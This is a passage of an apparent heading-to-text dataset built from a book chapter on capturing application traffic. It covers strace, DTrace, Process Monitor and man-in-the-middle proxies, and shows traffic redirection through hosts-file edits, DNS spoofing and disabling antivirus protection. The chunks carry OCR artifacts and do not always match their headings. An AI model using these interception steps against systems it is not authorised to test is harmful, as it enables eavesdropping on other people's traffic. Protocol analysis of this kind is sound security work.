.\nrecv, read, recvfrom Receives data from the network via the socket . The generic\nfunction read is for reading from a file descriptor, whereas\nrecv and recvfrom are specific to the socket’s API .\nsend, write, sendfrom Sends data over the network via the socket ."
  },
  {
    "input": "Monitoring Network Connections with DTrace",
    "output": "To learn more about how these system calls work, a great resource is\nThe TCP/IP Guide (No Starch Press, 2005). Plenty of online resources are\nalso available, and most Unix-like operating systems include manuals you\ncan view at a terminal using the command man 2 syscall_name. Now let’s look\nat how to monitor system calls.\nThe strace Utility on Linux\nIn Linux, you can directly monitor system calls from a user program with-\nout special permissions, unless the application you want to monitor runs as\na privileged user. Many Linux distributions include the handy utility strace,\nwhich does most of the work for you. If it isn’t installed by default, down-\nload it from your distribution’s package manager or compile it from source.\nRun the following command, replacing /path/to/app with the applica-\ntion you’re testing and args with the necessary parameters, to log the net-\nwork system calls used by that application:\n$ strace –e trace=network,read,write /path/to/app args\nLet’s monitor a networking application that reads and writes a few strings\nand look at the output from strace. Listing 2-1 shows four log entries (extra-\nneous logging has been removed from the listing for brevity).\n$ strace -e trace=network,read,write customapp\n--snip--\n socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3\n connect(3, {sa_family=AF_INET, sin_port=htons(5555),\nsin_addr=inet_addr(\"192.168.10.1\")}, 16) = 0\n write(3, \"Hello World!\\n\", 13) = 13\nx read(3, \"Boo!\\n\", 2048) = 5\nListing 2-1: Example output of the strace utility\nThe first entry  creates a new TCP socket, which is assigned the\nhandle 3. The next entry  shows the connect system call used to make\na TCP connection to IP address 192.168.10.1 on port 5555. The application\nthen writes the string Hello World!  before reading out a string Boo! x. The\noutput shows it’s possible to get a good idea of what an application is doing\nat the system call level using this utility, even if you don’t have high levels of\nprivilege.\nMonitoring Network Connections with DTrace\nDTrace is a very powerful tool available on many Unix-like systems, includ-\ning Solaris (where it was originally developed), macOS, and FreeBSD. It\nallows you to set system-wide probes on special trace providers, including\nsystem calls. You configure DTrace by writing scripts in a language with\na C-like syntax. For more details on this tool, refer to the DTrace Guide\nonline at http://www.dtracebook.com/index.php/DTrace_Guide.\n16 Chapter 2\nListing 2-2 shows an example of a script that monitors outbound IP con-\nnections using DTrace.\ntraceconnect.d /* traceconnect.d - A simple DTrace script to monitor a connect system call */\n struct sockaddr_in {\nshort sin_family;\nunsigned short sin_port;\nin_addr_t sin_addr;\nchar sin_zero[8];\n};\n syscall::connect:entry\n /arg2 == sizeof(struct sockaddr_in)/\n{\nx addr = (struct sockaddr_in*)copyin(arg1, arg2);\ny printf(\"process:'%s' %s:%d\", execname, inet_ntop(2, &addr->sin_addr),\nntohs(addr->sin_port));\n}\nListing 2-2: A simple DTrace script to monitor a connect system call\nThis simple script monitors the connect system call and outputs IPv4 TCP\nand UDP connections. The system call takes three parameters, represented\nby arg0, arg1, and arg2 in the DTrace script language, that are initialized\nfor us in the kernel. The arg0 parameter is the socket file descriptor (that\nwe don’t need), arg1 is the address of the socket we’re connecting to, and\narg2 is the length of that address. Parameter 0 is the socket handle, which\nis not needed in this case. The next parameter is the user process memory\naddress of a socket address structure, which is the address to connect to\nand can be different sizes depending on the socket type. (For example,\nIPv4 addresses are smaller than IPv6.) The final parameter is the length of\nthe socket address structure in bytes.\nThe script defines a sockaddr_in structure that is used for IPv4 connec-\ntions at ; in many cases these structures can be directly copied from the\nsystem’s C header files. The system call to monitor is specified at . At ,\na DTrace-specific filter is used to ensure we trace only connect calls where\nthe socket address is the same size as sockaddr_in. At x, the sockaddr_in\nstructure is copied from your process into a local structure for DTrace to\ninspect. At y, the process name, the destination IP address, and the port\nare printed to the console.\nTo run this script, copy it to a file called traceconnect.d and then run the\ncommand dtrace -s traceconnect.d as the root user. When you use a network-\nconnected application, the output should look like Listing 2-3.\nprocess:'Google Chrome' 173.194.78.125:5222\nprocess:'Google Chrome' 173.194.66.95:443\nprocess:'Google Chrome' 217.32.28.199:80\nprocess:'ntpd' 17.72.148.53:123\nprocess:'Mail' 173.194.67.109:993\nCapturing Application Traffic 17"
  },
  {
    "input": "Process Monitor on Windows",
    "output": "process:'syncdefaultsd' 17.167.137.30:443\nprocess:'AddressBookSour' 17.172.192.30:443\nListing 2-3: Example output from traceconnect .d script\nThe output shows individual connections to IP addresses, printing out\nthe process name, for example 'Google Chrome', the IP address, and the port\nconnected to. Unfortunately, the output isn’t always as useful as the output\nfrom strace on Linux, but DTrace is certainly a valuable tool. This demon-\nstration only scratches the surface of what DTrace can do.\nProcess Monitor on Windows\nIn contrast to Unix-like systems, Windows implements its user-mode net-\nwork functions without direct system calls. The networking stack is exposed\nthrough a driver, and establishing a connection uses the file open, read, and\nwrite system calls to configure a network socket for use. Even if Windows\nsupported a facility similar to strace, this implementation makes it more\ndifficult to monitor network traffic at the same level as other platforms.\nWindows, starting with Vista and later, has supported an event genera-\ntion framework that allows applications to monitor network activity. Writing\nyour own implementation of this would be quite complex, but fortunately,\nsomeone has already written a tool to do it for you: Microsoft’s Process\nMonitor tool. Figure 2-5 shows the main interface when filtering only on\nnetwork connection events.\nFigure 2-5: An example Process Monitor capture\n18 Chapter 2"
  },
  {
    "input": "Advantages and Disadvantages of Passive Capture",
    "output": "Selecting the filter circled in Figure 2-5 displays only events related to\nnetwork connections from a monitored process. Details include the hosts\ninvolved as well as the protocol and port being used. Although the capture\ndoesn’t provide any data associated with the connections, it does offer valu-\nable insight into the network communications the application is establish-\ning. Process Monitor can also capture the state of the current calling stack,\nwhich helps you determine where in an application network connections\nare being made. This will become important in Chapter 6 when we start\nreverse engineering binaries to work out the network protocol. Figure 2-6\nshows a single HTTP connection to a remote server in detail.\n(cid:31) (cid:30) (cid:29) (cid:28)\nFigure 2-6: A single captured connection\nColumn  shows the name of the process that established the connec-\ntion. Column  shows the operation, which in this case is connecting to a\nremote server, sending the initial HTTP request and receiving a response.\nColumn  indicates the source and destination addresses, and column x\nprovides more in-depth information about the captured event.\nAlthough this solution isn’t as helpful as monitoring system calls on other\nplatforms, it’s still useful in Windows when you just want to determine the\nnetwork protocols a particular application is using. You can’t capture data\nusing this technique, but once you determine the protocols in use, you can\nadd that information to your analysis through more active network traffic\ncapture.\nadvantages and disadvantages of passive capture\nThe greatest advantage of using passive capture is that it doesn’t disrupt the\nclient and server applications’ communication. It will not change the desti-\nnation or source address of traffic, and it doesn’t require any modifications\nor reconfiguration of the applications.\nPassive capture might also be the only technique you can use when you\ndon’t have direct control over the client or the server. You can usually find\na way to listen to the network traffic and capture it with a limited amount\nof effort. After you’ve collected your data, you can determine which active\ncapture techniques to use and the best way to attack the protocol you want\nto analyze.\nCapturing Application Traffic 19"
  },
  {
    "input": "Network Proxies",
    "output": "One major disadvantage of passive network traffic capture is that cap-\nture techniques like packet sniffing run at such a low level that it can dif-\nficult to interpret what an application received. Tools such as Wireshark\ncertainly help, but if you’re analyzing a custom protocol, it might not be\npossible to easily take apart the protocol without interacting with it directly.\nPassive capture also doesn’t always make it easy to modify the traffic an\napplication produces. Modifying traffic isn’t always necessary, but it’s useful\nwhen you encounter encrypted protocols, want to disable compression, or\nneed to change the traffic for exploitation.\nWhen analyzing traffic and injecting new packets doesn’t yield results,\nswitch tactics and try using active capture techniques.\nactive network traffic capture\nActive capture differs from passive in that you’ll try to influence the flow\nof the traffic, usually by using a man-in-the-middle attack on the network\ncommunication. As shown in Figure 2-7, the device capturing traffic usu-\nally sits between the client and server applications, acting as a bridge. This\napproach has several advantages, including the ability to modify traffic and\ndisable features like encryption or compression, which can make it easier to\nanalyze and exploit a network protocol.\nClient application Man-in-the-middle proxy Server application\nFigure 2-7: A man-in-the-middle proxy\nA disadvantage of this approach is that it’s usually more difficult\nbecause you need to reroute the application’s traffic through your active\ncapture system. Active capture can also have unintended, undesirable\neffects. For example, if you change the network address of the server or\nclient to the proxy, this can cause confusion, resulting in the application\nsending traffic to the wrong place. Despite these issues, active capture is\nprobably the most valuable technique for analyzing and exploiting appli-\ncation network protocols.\nnetwork proxies\nThe most common way to perform a man-in-the-middle attack on network\ntraffic is to force the application to communicate through a proxy service.\nIn this section, I’ll explain the relative advantages and disadvantages of\nsome of the common proxy types you can use to capture traffic, analyze\nthat data, and exploit a network protocol. I’ll also show you how to get\ntraffic from typical client applications into a proxy.\n20 Chapter 2"
  },
  {
    "input": "Port-Forwarding Proxy",
    "output": "Port-Forwarding Proxy\nPort forwarding is the easiest way to proxy a connection. Just set up a lis-\ntening server (TCP or UDP) and wait for a new connection. When that\nnew connection is made to the proxy server, it will open a forwarding\nconnection to the real service and logically connect the two, as shown\nin Figure 2-8.\nListening\nTCP\nTCP TCP TCP\nclient\nservice\nClient application TCP port-forwarding proxy Server application\nFigure 2-8: Overview of a TCP port-forwarding proxy\nSimple Implementation\nTo create our proxy, we’ll use the built-in TCP port forwarder included with\nthe Canape Core libraries. Place the code in Listing 2-4 into a C# script file,\nchanging LOCALPORT , REMOTEHOST , and REMOTEPORT x to appropriate values\nfor your network.\nPortFormat // PortFormatProxy.csx – Simple TCP port-forwarding proxy\nProxy.csx // Expose methods like WriteLine and WritePackets\nusing static System.Console;\nusing static CANAPE.Cli.ConsoleUtils;\n// Create proxy template\nvar template = new FixedProxyTemplate();\ntemplate.LocalPort = LOCALPORT;\ntemplate.Host = \"REMOTEHOST\";\ntemplate.Port = xREMOTEPORT;\n// Create proxy instance and start\ny var service = template.Create();\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nz service.Stop();\n// Dump packets\nvar packets = service.Packets;\nWriteLine(\"Captured {0} packets:\",\npackets.Count);\n{ WritePackets(packets);\nListing 2-4: A simple TCP port-forwarding proxy example\nCapturing Application Traffic 21\nThis very simple script creates an instance of a FixedProxyTemplate .\nCanape Core works on a template model, although if required you can get\ndown and dirty with the low-level network configuration. The script con-\nfigures the template with the desired local and remote network informa-\ntion. The template is used to create a service instance at y; you can think\nof documents in the framework acting as templates for services. The newly\ncreated service is then started; at this point, the network connections are\nconfigured. After waiting for a key press, the service is stopped at z. Then\nall the captured packets are written to the console using the WritePackets()\nmethod {.\nRunning this script should bind an instance of our forwarding proxy\nto the LOCALPORT number for the localhost interface only. When a new TCP\nconnection is made to that port, the proxy code should establish a new con-\nnection to REMOTEHOST with TCP port REMOTEPORT and link the two connections\ntogether.\nWARNING Binding a proxy to all network addresses can be risky from a security perspective\nbecause proxies written for testing protocols rarely implement robust security mecha-\nnisms. Unless you have complete control over the network you are connected to or\nhave no choice, only bind your proxy to the local loopback interface. In Listing 2-4,\nthe default is LOCALHOST; to bind to all interfaces, set the AnyBind property to true.\nRedirecting Traffic to Proxy\nWith our simple proxy application complete, we now need to direct our\napplication traffic through it.\nFor a web browser, it’s simple enough: to capture a specific request,\ninstead of using the URL form http://www.domain.com/resource, use http://\nlocalhost:localport/resource, which pushes the request through your port-\nforwarding proxy.\nOther applications are trickier: you might have to dig into the applica-\ntion’s configuration settings. Sometimes, the only setting an application\nallows you to change is the destination IP address. But this can lead to a\nchicken-and-egg scenario where you don’t know which TCP or UDP ports\nthe application might be using with that address, especially if the applica-\ntion contains complex functions running over multiple different service\nconnections. This occurs with Remote Procedure Call (RPC) protocols, such\nas the Common Object Request Broker Architecture (CORBA). This pro-\ntocol usually makes an initial network connection to a broker, which acts as\na directory of available services. A second connection is then made to the\nrequested service over an instance-specific TCP port.\nIn this case, a good approach is to use as many network-connected\nfeatures of the application as possible while monitoring it using passive\ncapture techniques. By doing so, you should uncover the connections that\napplication typically makes, which you can then easily replicate with for-\nwarding proxies.\nIf the application doesn’t support changing its destination, you need\nto be a bit more creative. If the application resolves the destination server\n22 Chapter 2\naddress via a hostname, you have more options. You could set up a custom\nDNS server that responds to name requests with the IP address of your proxy.\nOr you could use the hosts file facility, which is available on most operating\nsystems, including Windows, assuming you have control over system files on\nthe device the application is running on.\nDuring hostname resolving, the OS (or the resolving library) first refers\nto the hosts file to see if any local entries exist for that name, making a DNS\nrequest only if one is not found. For example, the hosts file in Listing 2-5\nredirects the hostnames www.badgers.com and www.domain.com to localhost.\n# Standard Localhost addresses\n127.0.0.1 localhost\n::1 localhost\n# Following are dummy entries to redirect traffic through the proxy\n127.0.0.1 www.badgers.com\n127.0.0.1 www.domain.com\nListing 2-5: An example hosts file\nThe standard location of the hosts file on Unix-like OSes is /etc/hosts,\nwhereas on Windows it is C:\\Windows\\System32\\Drivers\\etc\\hosts. Obviously,\nyou’ll need to replace the path to the Windows folder as necessary for your\nenvironment.\nNOTE Some antivirus and security products track changes to the system’s hosts, because\nchanges are a sign of malware. You might need to disable the product’s protection\nif you want to change the hosts file.\nAdvantages of a Port-Forwarding Proxy\nThe main advantage of a port-forwarding proxy is its simplicity: you wait for\na connection, open a new connection to the original destination, and then\npass traffic back and forth between the two. There is no protocol associated\nwith the proxy to deal with, and no special support is required by the appli-\ncation from which you are trying to capture traffic.\nA port-forwarding proxy is also the primary way of proxying UDP traf-\nfic; because it isn’t connection oriented, the implementation of a forwarder\nfor UDP is considerably simpler.\nDisadvantages of a Port-Forwarding Proxy\nOf course, the simplicity of a port-forwarding proxy also contributes to its\ndisadvantages. Because you are only forwarding traffic from a listening\nconnection to a single destination, multiple instances of a proxy would be\nrequired if the application uses multiple protocols on different ports.\nFor example, consider an application that has a single hostname or IP\naddress for its destination, which you can control either directly by chang-\ning it in the application’s configuration or by spoofing the hostname. The\napplication then attempts to connect to TCP ports 443 and 1234. Because\nCapturing Application Traffic 23"
  },
  {
    "input": "SOCKS Proxy",
    "output": "you can control the address it connects to, not the ports, you need to set up\nforwarding proxies for both, even if you are only interested in the traffic\nrunning over port 1234.\nThis proxy can also make it difficult to handle more than one con-\nnection to a well-known port. For example, if the port-forwarding proxy is\nlistening on port 1234 and making a connection to www.domain.com port\n1234, only redirected traffic for the original domain will work as expected.\nIf you wanted to also redirect www.badgers.com, things would be more dif-\nficult. You can mitigate this if the application supports specifying the desti-\nnation address and port or by using other techniques, such as Destination\nNetwork Address Translation (DNAT), to redirect specific connections to\nunique forwarding proxies. (Chapter 5 contains more details on DNAT as\nwell as numerous other more advanced network capture techniques.)\nAdditionally, the protocol might use the destination address for its own\npurposes. For example, the Host header in HyperText Transport Protocol\n(HTTP) can be used for Virtual Host decisions, which might make a port-\nforwarded protocol work differently, or not at all, from a redirected connec-\ntion. Still, at least for HTTP, I will discuss a workaround for this limitation\nin “Reverse HTTP Proxy” on page 32.\nSOCKS Proxy\nThink of a SOCKS proxy as a port-forwarding proxy on steroids. Not only\ndoes it forward TCP connections to the desired network location, but all\nnew connections start with a simple handshake protocol that informs the\nproxy of the ultimate destination rather than having it fixed. It can also\nsupport listening connections, which is important for protocols like File\nTransfer Protocol (FTP) that need to open new local ports for the server\nto send data to. Figure 2-9 provides an overview of SOCKS proxy.\nTCP client to TCP\nwww.domain.com\nSOCKS Listening\nSOCKS Server www.domain.com\nservice\nTCP listener TCP\nClient application SOCKS proxy from\nwww.badgers.com\nServer www.badgers.com\nFigure 2-9: Overview of SOCKS proxy\nThree common variants of the protocol are currently in use—SOCKS 4,\n4a, and 5—and each has its own use. Version 4 is the most commonly sup-\nported version of the protocol; however, it supports only IPv4 connections,\nand the destination address must be specified as a 32-bit IP address. An\n24 Chapter 2\nupdate to version 4, version 4a allowed connections by hostname (which is\nuseful if you don’t have a DNS server that can resolve IP addresses). Version 5\nintroduced hostname support, IPv6, UDP forwarding, and improved authen-\ntication mechanisms; it is also the only one specified in an RFC (1928).\nAs an example, a client will send the request shown in Figure 2-10 to\nestablish a SOCKS connection to IP address 10.0.0.1 on port 12345. The\nUSERNAME component is the only method of authentication in SOCKS version 4\n(not especially secure, I know). VER represents the version number, which in\nthis case is 4. CMD indicates it wants to connect out (binding to an address is\nCMD 2), and the TCP port and address are specified in binary form.\nVER CMD TCP PORT IP ADDRESS USERNAME NULL\n0x04 0x01 12345 0x10000001 \"james\" 0x00\nSize in octets 1 1 2 4 VARIABLE 1\nFigure 2-10: A SOCKS version 4 request\nIf the connection is successful, it will send back the appropriate response,\nas shown in Figure 2-11. The RESP field indicates the status of the response;\nthe TCP port and address fields are only significant for binding requests.\nThen the connection becomes transparent and the client and server directly\nnegotiate with each other; the proxy server only acts to forward traffic in\neither direction.\nVER RESP TCP PORT IP ADDRESS\n0x04 0x5A 0 0\nSize in octets 1 1 2 4\nFigure 2-11: A SOCKS version 4 successful response\nSimple Implementation\nThe Canape Core libraries have built-in support for SOCKS 4, 4a, and 5.\nPlace Listing 2-6 into a C# script file, changing LOCALPORT  to the local TCP\nport you want to listen on for the SOCKS proxy.\nSocksProxy.csx // SocksProxy.csx – Simple SOCKS proxy\n// Expose methods like WriteLine and WritePackets\nusing static System.Console;\nusing static CANAPE.Cli.ConsoleUtils;\n// Create the SOCKS proxy template\n var template = new SocksProxyTemplate();\ntemplate.LocalPort = LOCALPORT;\n// Create proxy instance and start\nvar service = template.Create();\nservice.Start();\nCapturing Application Traffic 25\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\n// Dump packets\nvar packets = service.Packets;\nWriteLine(\"Captured {0} packets:\",\npackets.Count);\nWritePackets(packets);\nListing 2-6: A simple SOCKS proxy example\nListing 2-6 follows the same pattern established with the TCP port-\nforwarding proxy in Listing 2-4. But in this case, the code at  creates a\nSOCKS proxy template. The rest of the code is exactly the same.\nRedirecting Traffic to Proxy\nTo determine a way of pushing an application’s network traffic through a\nSOCKS proxy, look in the application first. For example, when you open the\nproxy settings in Mozilla Firefox, the dialog in Figure 2-12 appears. From\nthere, you can configure Firefox to use a SOCKS proxy.\nFigure 2-12: Firefox proxy configuration\n26 Chapter 2\nBut sometimes SOCKS support is not immediately obvious. If you are\ntesting a Java application, the Java Runtime accepts command line param-\neters that enable SOCKS support for any outbound TCP connection. For\nexample, consider the very simple Java application in Listing 2-7, which con-\nnects to IP address 192.168.10.1 on port 5555.\nSocketClient.java // SocketClient.java – A simple Java TCP socket client\nimport java.io.PrintWriter;\nimport java.net.Socket;\npublic class SocketClient {\npublic static void main(String[] args) {\ntry {\nSocket s = new Socket(\"192.168.10.1\", 5555);\nPrintWriter out = new PrintWriter(s.getOutputStream(), true);\nout.println(\"Hello World!\");\ns.close();\n} catch(Exception e) {\n}\n}\n}\nListing 2-7: A simple Java TCP client\nWhen you run this compiled program normally, it would do as you\nexpect. But if on the command line you pass two special system properties,\nsocksProxyHost and socksProxyPort, you can specify a SOCKS proxy for any\nTCP connection:\njava –DsocksProxyHost=localhost –DsocksProxyPort=1080 SocketClient\nThis will make the TCP connection through the SOCKS proxy on local-\nhost port 1080.\nAnother place to look to determine how to push an application’s network\ntraffic through a SOCKS proxy is the OS’s default proxy. On macOS, navi-\ngate to System Preferences4Network4Advanced4Proxies. The dialog\nshown in Figure 2-13 appears. From here, you can configure a system-wide\nSOCKS proxy or general proxies for other protocols. This won’t always work,\nbut it’s an easy option worth trying out.\nIn addition, if the application just will not support a SOCKS proxy\nnatively, certain tools will add that function to arbitrary applications. These\ntools range from free and open source tools, such as Dante (https://www\n.inet.no/dante/) on Linux, to commercial tools, such as Proxifier (https://\nwww.proxifier.com/), which runs on Windows and macOS. In one way or\nanother, they all inject into the application to add SOCKS support and\nmodify the operation of the socket functions.\nCapturing Application Traffic 27\nFigure 2-13: A proxy configuration dialog on macOS\nAdvantages of a SOCKS Proxy\nThe clear advantage of using a SOCKS proxy, as opposed to using a simple\nport forwarder, is that it should capture all TCP connections (and poten-\ntially some UDP if you are using SOCKS version 5) that an application\nmakes. This is an advantage as long as the OS socket layer is wrapped to\neffectively push all connections through the proxy.\nA SOCKS proxy also generally preserves the destination of the connec-\ntion from the point of view of the client application. Therefore, if a client\napplication sends in-band data that refers to its endpoint, then the end-\npoint will be what the server expects. However, this does not preserve the\nsource address. Some protocols, such as FTP, assume they can request ports\nto be opened on the originating client. The SOCKS protocol provides a\nfacility for binding listening connections but adds to the complexity of the\nimplementation. This makes capture and analysis more difficult because\nyou must consider many different streams of data to and from a server.\nDisadvantages of a SOCKS Proxy\nThe main disadvantage of SOCKS is that support can be inconsistent\nbetween applications and platforms. The Windows system proxy sup-\nports only SOCKS version 4 proxies, which means it will resolve only local\n28 Chapter 2"
  },
  {
    "input": "Forwarding an HTTP Proxy",
    "output": "hostnames. It does not support IPv6 and does not have a robust authentica-\ntion mechanism. Generally, you get better support by using a SOCKS tool\nto add to an existing application, but this doesn’t always work well.\nHTTP Proxies\nHTTP powers the World Wide Web as well as a myriad of web services and\nRESTful protocols. Figure 2-14 provides an overview of an HTTP proxy.\nThe protocol can also be co-opted as a transport mechanism for non-web\nprotocols, such as Java’s Remote Method Invocation (RMI) or Real Time\nMessaging Protocol (RTMP), because it can tunnel though the most restric-\ntive firewalls. It is important to understand how HTTP proxying works in\npractice, because it will almost certainly be useful for protocol analysis,\neven if a web service is not being tested. Existing web application–testing\ntools rarely do an ideal job when HTTP is being used out of its original\nenvironment. Sometimes rolling your own implementation of an HTTP\nproxy is the only solution.\nHTTP client to HTTP\nwww.domain.com\nListening\nHTTP\nHTTP Server www.domain.com\nservice\nTunneled HTTPS\nClient application HTTP proxy HTTPS to\nwww.badgers.com\nServer www.badgers.com\nFigure 2-14: Overview of an HTTP proxy\nThe two main types of HTTP proxy are the forwarding proxy and the\nreverse proxy. Each has advantages and disadvantages for the prospective\nnetwork protocol analyzer.\nForwarding an HTTP Proxy\nThe HTTP protocol is specified in RFC 1945 for version 1.0 and RFC 2616\nfor version 1.1; both versions provide a simple mechanism for proxying\nHTTP requests. For example, HTTP 1.1 specifies that the first full line of\na request, the request line, has the following format:\nGET /image.jpg HTTP/1.1\nThe method  specifies what to do in that request using familiar\nverbs, such as GET, POST, and HEAD. In a proxy request, this does not change\nfrom a normal HTTP connection. The path  is where the proxy request\ngets interesting. As is shown, an absolute path indicates the resource that\nCapturing Application Traffic 29\nthe method will act upon. Importantly, the path can also be an absolute\nUniform Request Identifier (URI). By specifying an absolute URI, a proxy\nserver can establish a new connection to the destination, forwarding all\ntraffic on and returning data back to the client. The proxy can even manip-\nulate the traffic, in a limited fashion, to add authentication, hide version 1.0\nservers from 1.1 clients, and add transfer compression along with all man-\nner of other things. However, this flexibility comes with a cost: the proxy\nserver must be able to process the HTTP traffic, which adds massive com-\nplexity. For example, the following request line accesses an image resource\non a remote server through a proxy:\nGET http://www.domain.com/image.jpg HTTP/1.1\nYou, the attentive reader, might have identified an issue with this\napproach to proxying HTTP communication. Because the proxy must be\nable to access the underlying HTTP protocol, what about HTTPS, which\ntransports HTTP over an encrypted TLS connection? You could break out\nthe encrypted traffic; however, in a normal environment, it is unlikely the\nHTTP client would trust whatever certificate you provided. Also, TLS is\nintentionally designed to make it virtually impossible to use a man-in-the-\nmiddle attack any other way. Fortunately, this was anticipated, and RFC 2817\nprovides two solutions: it includes the ability to upgrade an HTTP connec-\ntion to encryption (there is no need for more details here), and more impor-\ntantly for our purposes, it specifies the CONNECT HTTP method for creating\ntransparent, tunneled connections over HTTP proxies. As an example, a\nweb browser that wants to establish a proxy connection to an HTTPS site\ncan issue the following request to the proxy:\nCONNECT www.domain.com:443 HTTP/1.1\nIf the proxy accepts this request, it will make a new TCP connection to\nthe server. On success, it should return the following response:\nHTTP/1.1 200 Connection Established\nThe TCP connection to the proxy now becomes transparent, and the\nbrowser is able to establish the negotiated TLS connection without the proxy\ngetting in the way. Of course, it’s worth noting that the proxy is unlikely to\nverify that TLS is actually being used on this connection. It could be any\nprotocol you like, and this fact is abused by some applications to tunnel out\ntheir own binary protocols through HTTP proxies. For this reason, it’s com-\nmon to find deployments of HTTP proxies restricting the ports that can be\ntunneled to a very limited subset.\nSimple Implementation\nOnce again, the Canape Core libraries include a simple implementation of\nan HTTP proxy. Unfortunately, they don’t support the CONNECT method to\n30 Chapter 2\ncreate a transparent tunnel, but it will suffice for demonstration purposes.\nPlace Listing 2-8 into a C# script file, changing LOCALPORT  to the local TCP\nport you want to listen on.\nHttpProxy.csx // HttpProxy.csx – Simple HTTP proxy\n// Expose methods like WriteLine and WritePackets\nusing static System.Console;\nusing static CANAPE.Cli.ConsoleUtils;\n// Create proxy template\n var template = new HttpProxyTemplate();\ntemplate.LocalPort = LOCALPORT;\n// Create proxy instance and start\nvar service = template.Create();\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\n// Dump packets\nvar packets = service.Packets;\nWriteLine(\"Captured {0} packets:\", packets.Count);\nWritePackets(packets);\nListing 2-8: A simple forward HTTP proxy example\nHere we created a forward HTTP Proxy. The code at line  is again\nonly a slight variation from the previous examples, creating an HTTP proxy\ntemplate.\nRedirecting Traffic to Proxy\nAs with SOCKS proxies, the first port of call will be the application. It’s\nrare for an application that uses the HTTP protocol to not have some\nsort of proxy configuration. If the application has no specific settings\nfor HTTP proxy support, try the OS configuration, which is in the same\nplace as the SOCKS proxy configuration. For example, on Windows you\ncan access the system proxy settings by selecting Control Panel4Internet\nOptions4Connections4LAN Settings.\nMany command line utilities on Unix-like systems, such as curl, wget,\nand apt, also support setting HTTP proxy configuration through environ-\nment variables. If you set the environment variable http_proxy to the URL\nfor the HTTP proxy to use—for example, http://localhost:3128—the applica-\ntion will use it. For secure traffic, you can also use https_proxy. Some imple-\nmentations allow special URL schemes, such as socks4://, to specify that you\nwant to use a SOCKS proxy.\nCapturing Application Traffic 31"
  },
  {
    "input": "Reverse HTTP Proxy",
    "output": "Advantages of a Forwarding HTTP Proxy\nThe main advantage of a forwarding HTTP proxy is that if the application\nuses the HTTP protocol exclusively, all it needs to do to add proxy support\nis to change the absolute path in the Request Line to an absolute URI and\nsend the data to a listening proxy server. Also, only a few applications that\nuse the HTTP protocol for transport do not already support proxying.\nDisadvantages of a Forwarding HTTP Proxy\nThe requirement of a forwarding HTTP proxy to implement a full HTTP\nparser to handle the many idiosyncrasies of the protocol adds significant\ncomplexity; this complexity might introduce processing issues or, in the\nworst case, security vulnerabilities. Also, the addition of the proxy desti-\nnation within the protocol means that it can be more difficult to retrofit\nHTTP proxy support to an existing application through external tech-\nniques, unless you convert connections to use the CONNECT method (which\neven works for unencrypted HTTP).\nDue to the complexities of handling a full HTTP 1.1 connection, it\nis common for proxies to either disconnect clients after a single request\nor downgrade communications to version 1.0 (which always closes the\nresponse connection after all data has been received). This might break\na higher-level protocol that expects to use version 1.1 or request pipelining,\nwhich is the ability to have multiple requests in flight to improve perfor-\nmance or state locality.\nReverse HTTP Proxy\nForwarding proxies are fairly common in environments where an internal\nclient is connecting to an outside network. They act as a security bound-\nary, limiting outbound traffic to a small subset of protocol types. (Let’s\njust ignore the potential security implications of the CONNECT proxy for a\nmoment.) But sometimes you might want to proxy inbound connections,\nperhaps for load-balancing or security reasons (to prevent exposing your\nservers directly to the outside world). However, a problem arises if you do\nthis. You have no control over the client. In fact, the client probably doesn’t\neven realize it’s connecting to a proxy. This is where the reverse HTTP proxy\ncomes in.\nInstead of requiring the destination host to be specified in the request\nline, as with a forwarding proxy, you can abuse the fact that all HTTP 1.1–\ncompliant clients must send a Host HTTP header in the request that\nspecifies the original hostname used in the URI of the request. (Note that\nHTTP 1.0 has no such requirement, but most clients using that version will\nsend the header anyway.) With the Host header information, you can infer\nthe original destination of the request, making a proxy connection to that\nserver, as shown in Listing 2-9.\n32 Chapter 2\nGET /image.jpg HTTP/1.1\nUser-Agent: Super Funky HTTP Client v1.0\nHost: www.domain.com\nAccept: */*\nListing 2-9: An example HTTP request\nListing 2-9 shows a typical Host header  where the HTTP request\nwas to the URL http://www.domain.com/image.jpg. The reverse proxy can\neasily take this information and reuse it to construct the original destina-\ntion. Again, because there is a requirement for parsing the HTTP head-\ners, it is more difficult to use for HTTPS traffic that is protected by TLS.\nFortunately, most TLS implementations take wildcard certificates where\nthe subject is in the form of *.domain.com or similar, which would match\nany subdomain of domain.com.\nSimple Implementation\nUnsurprisingly, the Canape Core libraries include a built-in HTTP reverse\nproxy implementation, which you can access by changing the template\nobject to HttpReverseProxyTemplate from HttpProxyTemplate. But for complete-\nness, Listing 2-10 shows a simple implementation. Place the following code\nin a C# script file, changing LOCALPORT  to the local TCP port you want to\nlisten on. If LOCALPORT is less than 1024 and you’re running this on a Unix-\nstyle system, you’ll also need to run the script as root.\nReverseHttp // ReverseHttpProxy.csx – Simple reverse HTTP proxy\nProxy.csx // Expose methods like WriteLine and WritePackets\nusing static System.Console;\nusing static CANAPE.Cli.ConsoleUtils;\n// Create proxy template\nvar template = new HttpReverseProxyTemplate();\ntemplate.LocalPort = LOCALPORT;\n// Create proxy instance and start\nvar service = template.Create();\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\n// Dump packets\nvar packets = service.Packets;\nWriteLine(\"Captured {0} packets:\",\npackets.Count);\nWritePackets(packets);\nListing 2-10: A simple reverse HTTP proxy example\nCapturing Application Traffic 33\nRedirecting Traffic to Your Proxy\nThe approach to redirecting traffic to a reverse HTTP proxy is similar to\nthat employed for TCP port-forwarding, which is by redirecting the con-\nnection to the proxy. But there is a big difference; you can’t just change\nthe destination hostname. This would change the Host header, shown in\nListing 2-10. If you’re not careful, you could cause a proxy loop.1 Instead, it’s\nbest to change the IP address associated with a hostname using the hosts file.\nBut perhaps the application you’re testing is running on a device that\ndoesn’t allow you to change the hosts file. Therefore, setting up a custom\nDNS server might be the easiest approach, assuming you’re able to change\nthe DNS server configuration.\nYou could use another approach, which is to configure a full DNS server\nwith the appropriate settings. This can be time consuming and error prone;\njust ask anyone who has ever set up a bind server. Fortunately, existing tools\nare available to do what we want, which is to return our proxy’s IP address\nin response to a DNS request. Such a tool is dnsspoof. To avoid install-\ning another tool, you can do it using Canape’s DNS server. The basic DNS\nserver spoofs only a 